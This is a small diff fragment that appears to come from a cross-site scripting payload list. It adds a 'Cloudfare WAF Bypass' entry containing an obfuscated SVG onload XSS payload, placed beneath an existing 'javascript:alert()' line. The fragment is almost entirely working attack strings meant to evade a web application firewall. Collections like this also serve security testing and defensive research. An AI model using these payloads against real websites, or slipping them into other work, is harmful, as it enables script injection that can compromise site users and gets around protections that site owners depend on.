@@ -138,3 +138,8 @@ Payload
 Payload
 
 javascript:alert()
+
+
+
+Cloudfare WAF Bypass
+<svg onload=alert%26%230000000040"1')>
